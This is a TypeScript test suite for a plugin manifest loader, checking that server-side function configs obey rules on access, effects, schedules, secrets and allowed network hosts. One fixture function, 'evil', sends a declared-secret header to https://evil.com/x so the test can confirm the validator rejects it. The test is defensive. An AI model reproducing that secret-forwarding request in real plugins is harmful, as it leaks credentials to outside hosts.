import { describe, expect, test } from 'bun:test';

import { loadDocument, PluginDocError, serverSchema } from './load';
import { manifestSchema } from './schema';
import { SERVER_ABILITIES } from './server-schema';

const md = (server: string) => `---\nspec: 1\nid: canteen-crowd\nname: 食堂人流\ndescription: Crowd levels in canteens.\nversion: 1.0.0\nauthor: pkuinfo\ncloud:\n  disclosure: { zh: ['你上报的食堂和拥挤程度（不含身份）'] }\nserver:\n${server}\n---\n\nShared crowd reports.\n`;
const load = (server: string) => loadDocument(async (p) => (p === 'PLUGIN.md' ? md(server) : Promise.reject(new Error(`missing ${p}`))));
const issuesOf = async (server: string) => {
  const e = await load(server).catch((x) => x as PluginDocError);
  expect(e).toBeInstanceOf(PluginDocError);
  return (e as PluginDocError).issues.join('\n');
};

const GOOD = `  network: [api.qweather.com]
  secrets: [QWEATHER_KEY]
  collections:
    reports:
      scope: plugin
      schema: { canteen: { type: string }, level: { enum: [low, mid, high] }, at: { type: number } }
      ttl: 2h
      index: [canteen, at]
      write: { perUser: 20/h }
  functions:
    report:
      effect: write
      input: { canteen: { enum: [学一, 学五] }, level: { enum: [low, mid, high] } }
      steps:
        - ability: collection.add
          args: "{ collection: 'reports', value: { canteen: input.canteen, level: input.level, at: now } }"
      return: "{ ok: true }"
    crowd:
      effect: read
      access: public
      cache: 30s
      steps:
        - let: rows
          ability: collection.query
          args: "{ collection: 'reports', where: r => r.at > now - 3600000 }"
      return: "groupBy(rows, r => r.canteen)"
    weather:
      effect: read
      steps:
        - let: wx
          request: { url: 'https://api.qweather.com/v7/weather/now', query: { key: '\${secrets.QWEATHER_KEY}' } }
          as: json
        - kv: set
          key: last
          value: wx
      return: wx
  schedules:
    morning:
      cron: "30 7 * * 1-5"
      for: each-user
      steps:
        - ability: push.send
          args: "{ title: '早', body: 'hi' }"
  limits: { steps: 50 }`;

describe('server: section', () => {
  test('a full section loads; access defaults to user', async () => {
    const d = await load(GOOD);
    const s = d.manifest.server!;
    expect(Object.keys(s.functions!)).toEqual(['report', 'crowd', 'weather']);
    expect(s.functions!.report!.access).toBe('user');
    expect(s.functions!.crowd!.access).toBe('public');
    expect(s.collections!.reports!.scope).toBe('plugin');
    expect(s.schedules!.morning!.for).toBe('each-user');
  });

  test('structure errors', async () => {
    const issues = await issuesOf(`  secrets: [lower]
  collections:
    reports:
      scope: world
      schema: { a: { type: string } }
      index: [a, b, c, d]
      write: { perUser: lots }
  schedules:
    both:
      cron: "* * * * *"
      every: 10m
      for: once
      steps: [{ value: 1 }]
    tooOften:
      every: 1m
      for: once
      steps: [{ value: 1 }]
    badCron:
      cron: "every morning"
      for: once
      steps: [{ value: 1 }]`);
    expect(issues).toContain('secrets.0');
    expect(issues).toContain('collections.reports.scope');
    expect(issues).toContain('collections.reports.index');
    expect(issues).toContain('collections.reports.write.perUser');
    expect(issues).toContain('exactly one of cron or every');
    expect(issues).toContain('at least 5m');
    expect(issues).toContain('five cron fields');
  });

  test('access/effect rules, server abilities, campus, hosts, secrets', async () => {
    const issues = await issuesOf(`  network: [example.com]
  functions:
    pub:
      effect: write
      access: public
      return: 1
    hook:
      effect: money
      access: webhook
      return: 1
    cached:
      effect: write
      cache: 1m
      return: 1
    phone:
      effect: write
      steps:
        - ability: todos.add
          args: "{ title: 'x' }"
        - ability: kv.set
          args: "{ key: 'a', value: 1 }"
    campus:
      effect: read
      steps:
        - request: { campus: portal, url: /x }
    evil:
      effect: read
      steps:
        - request: { url: 'https://evil.com/x', headers: { k: '\${secrets.NOPE}' } }
    weak:
      effect: read
      steps:
        - ability: kv.set
          args: "{ key: 'a', value: 1 }"`);
    expect(issues).toContain('server.functions.pub: public functions must have effect read');
    expect(issues).toContain("server.functions.hook: webhook functions can't have effect money");
    expect(issues).toContain('server.functions.cached.cache: only read functions can be cached');
    expect(issues).toContain("unknown ability 'todos.add'");
    expect(issues).not.toContain("unknown ability 'kv.set'");
    expect(issues).toContain("server.functions.campus › steps[0].request.campus: server functions can't reach campus services");
    expect(issues).not.toContain('is not listed in PLUGIN.md campus');
    expect(issues).toContain('host evil.com is not listed in PLUGIN.md network');
    expect(issues).toContain('secrets.NOPE is not declared in server.secrets');
    expect(issues).toContain("kv.set needs effect 'write' or stronger");
  });

  test('schemas are usable directly; the validation table refuses to run', async () => {
    expect(serverSchema.safeParse({ functions: { f: { effect: 'read', return: 1 } } }).success).toBe(true);
    // secret names can't hold '__' (the operator's env name splits plugin and name at the last '__')
    expect(serverSchema.safeParse({ secrets: ['API_KEY'] }).success).toBe(true);
    expect(serverSchema.safeParse({ secrets: ['CROWD__KEY'] }).success).toBe(false);
    expect(manifestSchema.shape.server).toBeDefined();
    await expect(SERVER_ABILITIES['kv.get']!.run({}, {} as never)).rejects.toThrow('only on the cloud server');
  });
});
